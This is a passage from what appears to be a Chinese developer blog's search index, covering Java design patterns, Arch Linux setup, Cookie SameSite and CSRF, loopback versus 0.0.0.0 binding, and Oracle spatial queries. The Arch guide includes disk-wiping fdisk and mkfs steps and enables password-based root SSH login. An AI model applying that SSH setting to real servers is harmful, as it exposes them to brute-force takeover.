def;        &#125;    &#125;&#125;\n\n负责人角色类 RoleStateCaretaker 能够得到的备忘录对象是以 Memento 为接口的，由于这个接口仅仅是一个标识接口，因此负责人角色不可能改变这个备忘录对象的内容\n//角色状态管理者类public class RoleStateCaretaker &#123;    private Memento memento;    public Memento getMemento() &#123;        return memento;    &#125;    public void setMemento(Memento memento) &#123;        this.memento = memento;    &#125;&#125;\n\n客户端测试类\npublic class Client &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;------------大战Boss前------------&quot;);        //大战Boss前        GameRole gameRole = new GameRole();        gameRole.initState();        gameRole.stateDisplay();        //保存进度        RoleStateCaretaker roleStateCaretaker = new RoleStateCaretaker();        roleStateCaretaker.setMemento(gameRole.saveState());                System.out.println(&quot;------------大战Boss后------------&quot;);        //大战Boss时，损耗严重        gameRole.fight();        gameRole.stateDisplay();        System.out.println(&quot;------------恢复之前状态------------&quot;);        //恢复之前状态        gameRole.recoverState(roleStateCaretaker.getMemento());        gameRole.stateDisplay();    &#125;&#125;\n\n优缺点\n优点：\n\n提供了一种可以恢复状态的机制。当用户需要时能够比较方便地将数据恢复到某个历史的状态。\n实现了内部状态的封装。除了创建它的发起人之外，其他对象都不能够访问这些状态信息。\n简化了发起人类。发起人不需要管理和保存其内部状态的各个备份，所有状态信息都保存在备忘录中，并由管理者进行管理，这符合单一职责原则。\n\n\n缺点：\n\n资源消耗大。如果要保存的内部状态信息过多或者特别频繁，将会占用比较大的内存资源。\n\n\n\n使用场景\n需要保存与恢复数据的场景，如玩游戏时的中间结果的存档功能。\n需要提供一个可回滚操作的场景，如 Word、记事本、Photoshop，idea等软件在编辑时按 Ctrl+Z 组合键，还有数据库中事务操作。\n\n解释器模式概述\n如上图，设计一个软件用来进行加减计算。我们第一想法就是使用工具类，提供对应的加法和减法的工具方法。\n//用于两个整数相加public static int add(int a,int b)&#123;    return a + b;&#125;//用于两个整数相加public static int add(int a,int b,int c)&#123;    return a + b + c;&#125;//用于n个整数相加public static int add(Integer ... arr) &#123;    int sum = 0;    for (Integer i : arr) &#123;        sum += i;    &#125;    return sum;&#125;\n\n上面的形式比较单一、有限，如果形式变化非常多，这就不符合要求，因为加法和减法运算，两个运算符与数值可以有无限种组合方式。比如 1+2+3+4+5、1+2+3-4等等。显然，现在需要一种翻译识别机器，能够解析由数字以及 + - 符号构成的合法的运算序列。如果把运算符和数字都看作节点的话，能够逐个节点的进行读取解析运算，这就是解释器模式的思维。\n定义：给定一个语言，定义它的文法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子。\n在解释器模式中，我们需要将待解决的问题，提取出规则，抽象为一种“语言”。比如加减法运算，规则为：由数值和+-符号组成的合法序列，“1+3-2” 就是这种语言的句子。解释器就是要解析出来语句的含义。\n文法（语法）规则：文法是用于描述语言的语法结构的形式规则。\nexpression ::= value | plus | minusplus ::= expression ‘+’ expression   minus ::= expression ‘-’ expression  value ::= integer\n\n\n这里的符号“::&#x3D;”表示“定义为”的意思，竖线 | 表示或，左右的其中一个，引号内为字符本身，引号外为语法。\n\n上面规则描述为：表达式可以是一个值，也可以是plus或者minus运算，而plus和minus又是由表达式结合运算符构成，值的类型为整型数。\n抽象语法树：在计算机科学中，抽象语法树（AbstractSyntaxTree，AST），或简称语法树（Syntax tree），是源代码语法结构的一种抽象表示。它以树状的形式表现编程语言的语法结构，树上的每个节点都表示源代码中的一种结构。用树形来表示符合文法规则的句子。\n\n结构解释器模式包含以下主要角色。\n\n抽象表达式（Abstract Expression）角色：定义解释器的接口，约定解释器的解释操作，主要包含解释方法 interpret()。\n终结符表达式（Terminal  Expression）角色：是抽象表达式的子类，用来实现文法中与终结符相关的操作，文法中的每一个终结符都有一个具体终结表达式与之相对应。\n非终结符表达式（Nonterminal Expression）角色：也是抽象表达式的子类，用来实现文法中与非终结符相关的操作，文法中的每条规则都对应于一个非终结符表达式。\n环境（Context）角色：通常包含各个解释器需要的数据或是公共的功能，一般用来传递被所有解释器共享的数据，后面的解释器可以从这里获取这些值。\n客户端（Client）：主要任务是将需要分析的句子或表达式转换成使用解释器对象描述的抽象语法树，然后调用解释器的解释方法，当然也可以通过环境角色间接访问解释器的解释方法。\n\n案例实现例：设计实现加减法的软件\n\n代码如下：\n//抽象角色AbstractExpressionpublic abstract class AbstractExpression &#123;    public abstract int interpret(Context context);&#125;//终结符表达式角色public class Value extends AbstractExpression &#123;    private int value;    public Value(int value) &#123;        this.value = value;    &#125;    @Override    public int interpret(Context context) &#123;        return value;    &#125;    @Override    public String toString() &#123;        return new Integer(value).toString();    &#125;&#125;//非终结符表达式角色  加法表达式public class Plus extends AbstractExpression &#123;    private AbstractExpression left;    private AbstractExpression right;    public Plus(AbstractExpression left, AbstractExpression right) &#123;        this.left = left;        this.right = right;    &#125;    @Override    public int interpret(Context context) &#123;        return left.interpret(context) + right.interpret(context);    &#125;    @Override    public String toString() &#123;        return &quot;(&quot; + left.toString() + &quot; + &quot; + right.toString() + &quot;)&quot;;    &#125;&#125;//非终结符表达式角色 减法表达式public class Minus extends AbstractExpression &#123;    private AbstractExpression left;    private AbstractExpression right;    public Minus(AbstractExpression left, AbstractExpression right) &#123;        this.left = left;        this.right = right;    &#125;    @Override    public int interpret(Context context) &#123;        return left.interpret(context) - right.interpret(context);    &#125;    @Override    public String toString() &#123;        return &quot;(&quot; + left.toString() + &quot; - &quot; + right.toString() + &quot;)&quot;;    &#125;&#125;//终结符表达式角色 变量表达式public class Variable extends AbstractExpression &#123;    private String name;    public Variable(String name) &#123;        this.name = name;    &#125;    @Override    public int interpret(Context ctx) &#123;        return ctx.getValue(this);    &#125;    @Override    public String toString() &#123;        return name;    &#125;&#125;//环境类public class Context &#123;    private Map&lt;Variable, Integer&gt; map = new HashMap&lt;Variable, Integer&gt;();    public void assign(Variable var, Integer value) &#123;        map.put(var, value);    &#125;    public int getValue(Variable var) &#123;        Integer value = map.get(var);        return value;    &#125;&#125;//测试类public class Client &#123;    public static void main(String[] args) &#123;        Context context = new Context();        Variable a = new Variable(&quot;a&quot;);        Variable b = new Variable(&quot;b&quot;);        Variable c = new Variable(&quot;c&quot;);        Variable d = new Variable(&quot;d&quot;);        Variable e = new Variable(&quot;e&quot;);        //Value v = new Value(1);        context.assign(a, 1);        context.assign(b, 2);        context.assign(c, 3);        context.assign(d, 4);        context.assign(e, 5);        AbstractExpression expression = new Minus(new Plus(new Plus(new Plus(a, b), c), d), e);        System.out.println(expression + &quot;= &quot; + expression.interpret(context));    &#125;&#125;\n\n优缺点\n优点：\n\n易于改变和扩展文法。由于在解释器模式中使用类来表示语言的文法规则，因此可以通过继承等机制来改变或扩展文法。每一条文法规则都可以表示为一个类，因此可以方便地实现一个简单的语言。\n实现文法较为容易。在抽象语法树中每一个表达式节点类的实现方式都是相似的，这些类的代码编写都不会特别复杂。\n增加新的解释表达式较为方便。如果用户需要增加新的解释表达式只需要对应增加一个新的终结符表达式或非终结符表达式类，原有表达式类代码无须修改，符合 “开闭原则”。\n\n\n缺点：\n\n对于复杂文法难以维护。在解释器模式中，每一条规则至少需要定义一个类，因此如果一个语言包含太多文法规则，类的个数将会急剧增加，导致系统难以管理和维护。\n执行效率较低。由于在解释器模式中使用了大量的循环和递归调用，因此在解释较为复杂的句子时其速度很慢，而且代码的调试过程也比较麻烦。\n\n\n\n使用场景\n当语言的文法较为简单，且执行效率不是关键问题时。\n当问题重复出现，且可以用一种简单的语言来进行表达时。\n当一个语言需要解释执行，并且语言中的句子可以表示为一个抽象语法树的时候。\n\n总结目前为止最长且花得时间最久的，不想总结了。\n设计模式算是了解了一遍，具体的还得在以后的写代码的过程中慢慢深入体会。以后看一些框架源码应该会更加轻松一些吧。（也许）\n","categories":["学习笔记"],"tags":["java","设计模式","设计原则","UML"]},{"title":"ArchLinux作为主力系统","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/ArchLinux%E4%BD%9C%E4%B8%BA%E4%B8%BB%E5%8A%9B%E7%B3%BB%E7%BB%9F/","content":"系统之前就在虚拟机和笔记本上装过 ArchLinux，想尝试尝试 Linux 系统作为主力开发系统。主要原因是 windows 的命令行很难用，即便是有了 powershell，也改变不了使用它的痛苦。特别是之前做 CI&#x2F;CD 写 Makefile、Dokcerfile 和 github workflow.yaml 。光是路径问题就花了很久。替换的契机是前几天用 rdp 远程开发的时候，连接断开（第二次了）。等到回去一看，电脑没有任何反应，应该是死机了。不知道任何原因。所以花了两三天，给电脑刷了 ArchLinux 系统。\n之前有写过一篇安装过程，其实还是很繁琐的。后来发现其实系统镜像内置了方便的工具 archinstall ，只需要根据选项进行配置就可以了。比我自己手动装的要好不少（一些配置方面\n装完之后难免要去自己自定义美化一下，虽然默认的审美上比以前用过的 ubuntu 桌面之类的有些提升。下面就是都装完之后，选个好看的壁纸：\n\n问题输入法使用这个系统目前还是有很多问题的，主要集中在 KDE 的 wayland 这个桌面和图形平台上。最严重的莫过于输入法的问题了，纯英文情况下还可以，只要配置得当，不会有什么问题。但是中文就不太行了。\nJetbrains Idea 至今还不支持。详见：(Wayland: support input methods (text-input-unstable-v3))[https://youtrack.jetbrains.com/issue/JBR-5672/Wayland-support-input-methods-text-input-unstable-v3]好消息是将在2025.3版本支持，坏消息是目前最新正式版本是2025.2.5。也是给我赶上了，明年就能用了（好耶！）\nVSCode 我以为也不会有问题的，结果和 Idea 的表现一模一样。（用的微软官方提供的 visual-studio-code-bin 版本不过好消息是可以解决。\n修改 ~/.config/code-flags.conf 文件即可（文件默认不存在，需要创建），添加以下内容：\n--enable-features=UseOzonePlatform--ozone-platform-hint=wayland--enable-wayland-ime\n\n远程控制另一个问题就是远程控制了，对于远程开发来说还是很重要的功能。但很可惜，wayland 在这方面做的很不好，可能与他们的安全限制有关系，无法做到无人值守的状态。\n目前只能是使用 ssh 了。对于桌面可能就无缘了。\n不过对于 Idea 远程开发，使用了它们的 Jetbrains Gateway 的方案。不得不说，各种问题，光是安装就费了我很大的劲，不过好在安装完可以用，虽然体验没那么好。Jetbrains 在远程开发和 AI 方面真的是没有跟上。\n后续可能会尝试  VSCode 的远程开发，不过我用惯了 Jetbrains，是真不习惯 VSCode。\n2025-12-07 后记终于是受不了 Wayland 的各种问题了，决定回归初心。作为开发环境，需要的是稳定，默认的也许就是最好的，于是决定转向 Ubuntu。选择的系统是 Linux Mint，在经过了一个晚上之后，就得到了：\n\n标题也许换成 《Linux 作为主力系统》 更合适。\n","categories":["编程记录"],"tags":["Arch Linux"]},{"title":"ArchLinux安装","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/ArchLinux%E5%AE%89%E8%A3%85/","content":"前言Ubuntu、Deepin之类的玩腻了，尝试下新鲜玩意。最开始在旧电脑上尝试直接安装，但是失败了，很多报错，现在看来是镜像源的问题。然后尝试在 Hyper-V 虚拟机中安装，过程很顺利，基本没有问题。最后再次尝试在旧电脑物理机上安装，有了虚拟机的经验，安装也比较顺利。唯一失败的就是：分区时没注意磁盘，将分区信息写到了系统u盘，导致u盘数据丢失。惨痛的教训 lsblk 或者 fdisk -l 很重要！\n安装 Arch Linux 系统首先进入 Arch Live 环境（archiso），是官方 ISO 引导后的安装环境。\nArch Linux 6.15.8-arch1-2 (tty1)archiso login:root (automatic login)To install Arch Linux follow the installation guide:https://wiki.archlinux.org/title/Installation_guideFor Wi-Fi,authenticate to the wireless network using the iwctl utility.For mobile broadband (WWAN) modems,comnect with the mmcli utility.Ethernet,WLAN and WWAN interfaces using DHCP should work automatically.After comnecting to the internet,the installation guide can be accessedvia the convenience script Installation_guide.root@archiso ~ #\n\n配置网络ping archlinux.org -c 3 确认是否有网络\n如果是有线网络，通常自动就有网络。如果是 WIFI ，使用 iwctl 命令：\niwctl# 交互模式下（示例）device liststation wlan0 scanstation wlan0 get-networksstation wlan0 connect YOUR_SSIDstation list # 用于查看连接状态# exit 返回\n\n启动模式ls /sys/firmware/efi/efivars 用于输出 EFI 变量，区分启动模式是 BIOS 还是 UEFI。\n\nBIOS 启动：内核只会得到传统的硬件初始化信息，不会加载 EFI 相关功能。\nUEFI 启动：内核会通过 UEFI 固件接口（EFI Runtime Services）获得一系列 EFI 变量（比如引导顺序、启动项、安全启动开关等）。Linux 内核会把这些变量暴露在文件系统里，就是 /sys/firmware/efi/efivars。\n\n所以 UEFI 启动必须有一个 EFI 分区 (ESP)，格式化为 FAT32，挂载到 /boot 或 /boot/efi。\nBIOS 与 UEFIBIOS：\n\n历史悠久：BIOS（Basic Input&#x2F;Output System）是上世纪 80 年代就有的固件。\n分区表限制：BIOS 通常和 MBR 分区表搭配使用。MBR 最大只支持 2TB 硬盘容量，最多 4 个主分区。\n启动方式：BIOS 启动时，会从磁盘开头的 MBR (Master Boot Record) 读取引导代码，然后加载操作系统。\n兼容性好：老机器几乎都是 BIOS，新机器大多支持兼容模式（CSM），可以让 BIOS 模式继续使用。\n\nUEFI：\n\n现代标准：UEFI（Unified Extensible Firmware Interface）是 BIOS 的替代品，大多数 2015 年以后的电脑默认用 UEFI。\n分区表支持：UEFI 通常和 GPT 分区表搭配。GPT 支持 &gt;2TB 的硬盘，分区数量几乎无限制。\n启动方式：UEFI 会读取硬盘上的 EFI 系统分区 (ESP)，里面存放引导程序（例如 grubx64.efi 或 systemd-boot）。\n功能更强：支持图形界面、鼠标操作、安全启动（Secure Boot）、多系统管理更方便。\n\n分区设置一定注意分区设置的位置！事先使用 lsblk 或者 fdisk -l 命令查看磁盘信息，确定分区位置。\n创建分区fdisk /dev/sda\n\n然后依次输入：\ng                   # 创建 GPT 分区表n                   # 新建分区 1&lt;回车&gt;              # 分区号，直接回车（默认 1）&lt;回车&gt;              # 起始扇区，直接回车（默认）+512M               # 结束扇区，输入大小 → +512Mt                   # 改类型1                   # 选择分区 11                   # 设置为 EFI Systemn                   # 新建分区 2&lt;回车&gt;              # 分区号，直接回车（默认 2）&lt;回车&gt;              # 起始扇区，直接回车+2G                 # 结束扇区，输入大小 → +2Gt                   # 改类型2                   # 选择分区 219                  # 设置为 Linux swapn                   # 新建分区 3&lt;回车&gt;              # 分区号，直接回车（默认 3）&lt;回车&gt;              # 起始扇区，直接回车&lt;回车&gt;              # 结束扇区，直接回车（用完剩余空间）w                   # 保存并退出\n\n格式化分区# EFI 分区mkfs.fat -F32 /dev/sda1# swap 分区mkswap /dev/sda2swapon /dev/sda2# 根分区mkfs.ext4 /dev/sda3\n\n挂载分区mount /dev/sda3 /mntmkdir -p /mnt/bootmount /dev/sda1 /mnt/boot\n\n配置镜像源（可选）\n临时使用国内镜像在 live 环境里，修改 pacman 的镜像源列表： # 先备份原来的cp /etc/pacman.d/mirrorlist /etc/pacman.d/mirrorlist.bak# 编辑镜像列表nano /etc/pacman.d/mirrorlist\n把国内源放到前面，例如： Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$archServer = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$archServer = https://mirrors.aliyun.com/archlinux/$repo/os/$arch\n\n注意：把想用的镜像放在 最上面，pacman 会优先使用。保存退出后，运行： pacman -Syyu\n\n\n选择最快的镜像Arch 自带 reflector 工具（Live ISO 可能没有，需要先安装）： pacman -Sy reflector --noconfirmreflector --country China --latest 5 --sort rate --save /etc/pacman.d/mirrorlist\n会自动选择最近最快的中国镜像。\n\n安装基础系统pacstrap /mnt base linux linux-firmware vim nano networkmanager\n\n安装完成后生成 fstab：\ngenfstab -U /mnt &gt;&gt; /mnt/etc/fstab\n\n然后进入新系统环境：\narch-chroot /mnt\n\n安装并配置 bootloader（UEFI 推荐 GRUB 或 systemd-boot）使用 GRUB（UEFI）pacman -S --noconfirm grub efibootmgr dosfstools os-prober mtoolsgrub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=GRUBgrub-mkconfig -o /boot/grub/grub.cfg\n\n使用 GRUB（BIOS）pacman -S --noconfirm grubgrub-install --target=i386-pc /dev/sda   # 注意写在磁盘（如 /dev/sda），不是分区grub-mkconfig -o /boot/grub/grub.cfg\n\n系统其余配置\n时区： ln -sf /usr/share/zoneinfo/Asia/Taipei /etc/localtimehwclock --systohc\n本地化（示例同时启用 zh_CN.UTF-8 与 en_US.UTF-8）： sed -i &#x27;s/^#zh_CN.UTF-8/zh_CN.UTF-8/&#x27; /etc/locale.gensed -i &#x27;s/^#en_US.UTF-8/en_US.UTF-8/&#x27; /etc/locale.genlocale-genecho LANG=zh_CN.UTF-8 &gt; /etc/locale.confecho KEYMAP=us &gt; /etc/vconsole.conf   # 如需中文控制台可改为 zh_CN\n主机名与 hosts： echo arch &gt; /etc/hostnamecat &gt;&gt; /etc/hosts &lt;&lt;EOF127.0.0.1\tlocalhost::1\t\t    localhostEOF\nroot 密码： passwd\n\n安装 ssh 服务sudo pacman -S --noconfirm opensshsudo systemctl enable sshdsudo systemctl start sshd\n记得编辑/etc/ssh/sshd_config:\nPasswordAuthentication yes   # 允许密码登录PermitRootLogin yes          # 如果你用 root 登录（可选）UsePAM yes                   # 必须启用 PAM\n\nsudo systemctl restart sshd\n安装 KDE 桌面环境sudo pacman -Syu 更新系统sudo pacman -S --noconfirm xorg 安装 Xorg（显示服务器）\n安装 KDE Plasma 桌面和常用应用：\n\nsudo pacman -S --noconfirm plasma kde-system-meta kde-utilities-meta 最小化安装，比较轻量\nsudo pacman -S --noconfirm plasma kde-applications 完整安装（含所有 KDE 应用，比如浏览器、相册、邮件客户端等）\n\n安装登录管理器（推荐 SDDM）：\nsudo pacman -S --noconfirm sddmsudo systemctl enable sddm\n\nsudo pacman -S noto-fonts noto-fonts-cjk noto-fonts-emoji adobe-source-han-sans-cn-fonts adobe-source-han-serif-cn-fonts 安装 KDE 常用中文字体\n手动指定QT环境变量，在 ~/.xprofile 或 ~/.bashrc 里加上：\nexport LANG=zh_CN.UTF-8export LC_ALL=zh_CN.UTF-8export QT_QPA_PLATFORMTHEME=kde\n\n\n","categories":["编程记录"],"tags":["Arch Linux"]},{"title":"Cookie的SameSite跨站限制","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/Cookie%E7%9A%84SameSite%E8%B7%A8%E7%AB%99%E9%99%90%E5%88%B6/","content":"场景一个前端vue，后端springboot的项目部署在服务器上。此时，想编写dockerfile，将他们放在docker中再部署。方便部署到其他地方。\n编写完vue的dockerfile后，运行。然后访问。发现每次请求的sessionId都不一样。（已经不知道多少次出现这个现象了，肯定是跨域的问题然后排错，发现 Set-Cookie 响应头的值后面有个黄色的警告：此Set-Cookie标头未指定“SameSite“属性，它默认为”SameSite=Lax“，必须为此SetCookie设置“SameSite=None“才能实现跨站点使用\n于是去查了 SameSite 属性\nSameSite 属性微软文档 SameSite cookie 属性\ncookies 机制一直被认为是不安全的。SameSite 属性是谷歌浏览器为完善 cookies 安全机制出的特性之一。Chrome 80 于 2020 年 2 月发布，引入了新的 Cookie 值 SameSite，并默认实施 Cookie 策略。SameSite 属性有三个可选值 Strict、Lax 或 None。 如果未指定，则 Cookie SameSite 属性默认采用值 SameSite&#x3D;Lax。ameSite 属性用来限制第三方 Cookie的行为。\n\n\n\n设置\n强制执行\n值\n属性规范\n\n\n\nLax\n大多数情况也不发送第三方Cookie，但是导航到目标站点的Get请求、预加载（link标签）和链接（a标签）除外。\nDefault\nSet-Cookie:key&#x3D;value;SameSite&#x3D;Lax\n\n\nStrict\n完全禁止第三方Cookie，当当前站点与请求目标站点是跨站关系时，总是不会发送Cookie。换言之，只有当前站点与请求目标站点是同站关系时，才会带上Cookie。\n可选\nSet-Cookie:key&#x3D;value;SameSite&#x3D;Strict\n\n\nNone\n允许第三方Cookie，始终发送。站点选择显式关闭SameSite属性时，在将其值设为None的同时。必须同时设置Secure属性（表示Cookie只能通过HTTPS协议发送），否则无效。\n可选，但如果设置，则需要HTTPS协议。\nSet-Cookie:key&#x3D;value;SameSite&#x3D;None;Secure\n\n\n默认值为 Lax，基本只有只读请求（资源请求和Get，不会改变服务器资源）会携带 Cookie。其他POST（会执行数据库 insert、update和delete）的请求不会携带 Cookie更加详细地，关于 http 和 https 等情况 Cookie 的携带情况可以参考下面这篇博客园的文章\nCookies的SameSite属性\n\n这里有一个注意点，跨域和跨站的区别：源是 协议、主机名、端口 的组合，同源要求三者完全相同。一般的同站域名相同即可，但也有同协议同站，因为考虑到攻击者会利用不安全的http发起CSRF攻击一个https安全站点。详细参考：讲清楚同源、跨源、同站、跨站\n\n问题的解决方案知道 SameSite 属性有什么作用之后，也就知道了上面遇到问题的原因：\n前端项目放在 docker 中，docker 跑在本地，浏览器访问本地 127.0.0.1后端服务跑在服务器，浏览器访问公网ip这肯定是跨站的，由于所使用的浏览器比较新，Cookie 的 SameSite 属性默认值为 Laz，所以不会携带 Cookie。后端服务会认为这些请求都是新用户发起，因为没有获得 SessionId ，所以每次都会新建一个 Session，并将 SessionId 设置进 cookie 中。\n而部署在同一个服务器上的前端项目则不会有这个问题。因为是同站的。\n也没有什么好的解决方案，因为我的服务器没有配置域名，所以没有是用不了 https 协议。以至于无法设置 SameSite 属性为 None。因为是在开发测试阶段，所以影响不大。使用低版本的浏览器访问或许可以。\n然后就是查阅的博客和资料中都提到了 CSRF攻击，后面记录下。\n另外，有个问题：前后端服务部署在同一个服务器上不会有问题，但是部署到不同服务器…那不就是我现在遇到问题的情况吗，首先想到的解决办法就是 nginx 的反向代理。后面去验证下。\nCSRF攻击什么是CSRF？如何防御CSRF攻击？前端 | CSRF 的攻击类型与防御【基本功】 前端安全系列之二：如何防止CSRF攻击？\nCSRF（Cross-Site Request Forgery），也被称为 one-click attack 或者 session riding，即跨站请求伪造攻击。是一种劫持受信任用户向服务器发送非预期请求的攻击方式。攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。\n简单来说，就是用户持有网站A验证过的 Cookie，有进行相关的请求的权限。此时，该用户访问了网站B，那B就可以向A发送跨站请求。浏览器会将这些请求加上有效的 Cookie，B就达到可以对A执行某些操作的目的。\nCSRF 利用的是网站对用户网页浏览器的信任。\n所以 SameSite 属性限制了 跨站请求 Cookie 的携带。一定程度上可以防止 CSRF 攻击。\nnginx 反向代理vue 中将所有请求加上前缀\nimport axios from &#x27;axios&#x27;;const app = axios.create(&#123;    baseURL: &#x27;/api&#x27;,    timeout: 10000,&#125;);export default app;\n\n这时，vue 中所有 axios 请求都会请求 ip:host&#x2F;api&#x2F;真实后端请求\n然后，在 nginx 中配置反向代理\nconfigurationserver &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    location / &#123;        root   /usr/share/nginx/html;        index  index.html index.htm;    &#125;      # 代理后端API的配置    location /api/ &#123; # 用于转发的路径标记        proxy_pass http://ip:8080/; # 被代理的API地址    &#125;&#125;\n\n这时，前端所有请求都是同源的。不会有任何的跨域问题。（至少我认为不会有静态资源的请求 nginx 会处理并返回动态资源的请求 nginx 会转发浏览器完全感觉不到后端的存在，即便是查看请求信息。（可以隐藏真实的服务端\n其他参考深入理解 Cookie 的 SameSite 属性Feature: Cookies default to SameSite&#x3D;Lax当浏览器全面禁用三方 Cookie完美解决Chrome Cookie SameSite跨站限制cookie session都过时了，现在是HTML5时代\n","categories":["编程记录"],"tags":["cookie","跨域","跨站","CSRF攻击","nginx","反向代理"]},{"title":"localhost、127.0.0.1和0.0.0.0的区别","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/localhost%E3%80%81127-0-0-1%E5%92%8C0-0-0-0%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"产生的问题及原因编写 socket 发送端和接收端程序。本地测试功能正常，但部署到云服务器测试时出现问题。报错为 连接被拒绝\n这个问题的答案早在 2022年的7月30日 就遇到，并且找到的解决方案。但是在半年多之后的4月5日，又碰到这个问题并且耗费了很多时间。所以在此较为详细的记录一下。\n回到上面的问题，解决的方案是：将接收端程序监听的 host 从 127.0.0.1 或者 localhost 改为 0.0.0.0 或者 指定网卡的 ip下面开始是这三个的详细区别\n127.0.0.1所有以 127 开头的 IP 地址，都是回环地址（loop back address）其所在的回环接口一般被理解为虚拟网卡，并不是真正的路由器接口。\n回环地址，就是任何发送给以 127 开头的回环地址的数据包，都会被自己接受。就是发不出去。\n那么，为什么上面接收端程序监听回环地址不能收到外部发来的信息呢？因为 回环地址绑定在 loopback 接口上，只能本机访问。这也是为什么本地测试成功的原因（接收端与发送端部署在一台机器上）。\n\n正常的数据包会从IP层进入链路层，然后发送到网络上。而给回环地址发送数据包，数据包会直接被发送主机的IP层获取，后面就没有链路层的事了。\n\nlocalhostlocalhost 是个域名通常被默认指向 127.0.0.1 这个地址，以及支持 ipv6 的 [::1]\nlinux 中被定义在 &#x2F;etc&#x2F;hosts 文件中，是可以修改的。指向其他 ip 地址也是没有问题的，毕竟只是个域名。\n0.0.0.0ipv4 中，0.0.0.0 表示一个无效的、未知的、不可用的目标。被称为 Unspecified它表示本机中所有的 ipv4 地址，不指定监听哪个网卡时，可以使用 0.0.0.0 监听本机所有 ip 的端口。\n总结有区别，区别说大也大，说不大也还行。反正使用的时候要注意。\n另外就是关于查看网卡信息的命令 ifconfig查看网卡信息：ifconfig命令及详细介绍\n","categories":["编程记录"],"tags":["ip地址"]},{"title":"oracle通过经纬度过滤范围内数据","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/oracle%E9%80%9A%E8%BF%87%E7%BB%8F%E7%BA%AC%E5%BA%A6%E8%BF%87%E6%BB%A4%E8%8C%83%E5%9B%B4%E5%86%85%E6%95%B0%E6%8D%AE/","content":"Start今天的需求是在地图上撒了很多点，右击这个点时，可以选择一个半径，呈现在这个半径范围内的点。和之前一个在地图上框选多边形区域的需求一样，需要通过经纬度来计算过滤数据。\n这里是通过 Oracle 的空间运算符实现的。主要使用下面两个：\n\nSDO_WITHIN_DISTANCEIdentifies the set of spatial objects that are within some specified distance of a given object, such as an area of interest or point of interest.标识位于给定对象（如感兴趣区域或感兴趣点）的某个指定距离内的空间对象集。\nSDO_INSIDEChecks if any geometries in a table have the INSIDE topological relationship with a specified geometry. Equivalent to specifying the SDO_RELATE operator with ‘mask&#x3D;INSIDE’.检查表中的任何几何是否与指定几何具有 INSIDE 拓扑关系。等效于使用 ‘mask&#x3D;INSIDE’ 指定 SDO_RELATE 运算符。\n\n需求实现首先需要确保表中有经纬度的字段和数据，并且不为空。\ndeletefrom T_GISwhere LONGITUDE is null   or LATITUDE is null;\n\n然后需要新建一个字段，为存储空间类型。存储经纬度转换后的数据。\nalter table T_GIS    add POINT_GEOMETRY SDO_GEOMETRY\n\n将转换后的经纬度存储到这个字段中。\nUPDATE T_GIS aSET a.POINT_GEOMETRY = SDO_GEOMETRY(        2001, -- 点类型        8307, -- WGS84 坐标系        SDO_POINT_TYPE(a.LONGITUDE, a.LATITUDE, NULL), -- 点坐标        NULL, -- 无元素信息        NULL -- 无坐标数组                       )where LONGITUDE is not null  and LATITUDE is not null;\n\n然后需要为这个字段创建空间索引。\nDROP INDEX T_GIS_SPATIAL_IDX;CREATE INDEX T_GIS_SPATIAL_IDX    ON T_GIS (POINT_GEOMETRY)    INDEXTYPE IS MDSYS.SPATIAL_INDEX;\n\n然后就可以使用 SDO_WITHIN_DISTANCE 来查询了。\nselect *from T_GIS awhere a.POINT_GEOMETRY is not null  and a.LONGITUDE is not null  and a.LATITUDE is not null  and SDO_WITHIN_DISTANCE(              a.POINT_GEOMETRY,              SDO_GEOMETRY(                      2001, -- 点类型                      8307, -- WGS84 坐标系                      SDO_POINT_TYPE(104.48060937499996, 36.30556423523153, NULL), -- 点坐标 (经度, 纬度, 高度)                      NULL, -- 无元素信息                      NULL -- 无坐标数组              ),              &#x27;DISTANCE=1000&#x27;      ) = &#x27;TRUE&#x27;;\n\n如果报错，可以使用下面的语句查看异常数据：\nSELECT *FROM T_GISWHERE SDO_GEOM.VALIDATE_GEOMETRY_WITH_CONTEXT(POINT_GEOMETRY, 0.005) != &#x27;TRUE&#x27;;\n\nWGS84 坐标系WGS84（World Geodetic System 1984）是目前全球最广泛使用的 大地坐标系（Geodetic Coordinate System），由美国国防部（DoD）制定，用于 GPS 定位、地图绘制、GIS 系统 等场景。\n\nWGS84 是一个 地球参考坐标系，用于描述地球表面点的位置（经度、纬度、高程）。\n它基于 椭球体模型（参考椭球），并定义了地球的形状、大小和重力场。\n\n核心参数\n\n\n参数\n值\n说明\n\n\n\n椭球体长半轴（a）\n6,378,137 米\n赤道半径\n\n\n椭球体短半轴（b）\n6,356,752.3142 米\n极半径\n\n\n扁率（f）\n1&#x2F;298.257223563\nf = (a - b) / a\n\n\n第一偏心率平方（e²）\n0.00669437999014\n用于坐标转换\n\n\n地球自转角速度（ω）\n7.292115 × 10⁻⁵ rad&#x2F;s\n影响重力场计算\n\n\n地心引力常数（GM）\n3.986004418 × 10¹⁴ m³&#x2F;s²\n用于卫星轨道计算\n\n\n坐标表示WGS84 使用 经度（Longitude）、纬度（Latitude）、高程（Height） 表示位置：\n\n经度（λ）：东经（0°180°E）或西经（0°180°W）。\n纬度（φ）：北纬（0°90°N）或南纬（0°90°S）。\n高程（h）：相对于 WGS84 椭球面的高度（单位：米）。\n\nWGS84 的常见用途\nGPS 定位\n全球定位系统（GPS）默认使用 WGS84 坐标系。\n手机、车载导航、无人机等设备的定位数据通常基于 WGS84。\n\n\n地图服务\nGoogle 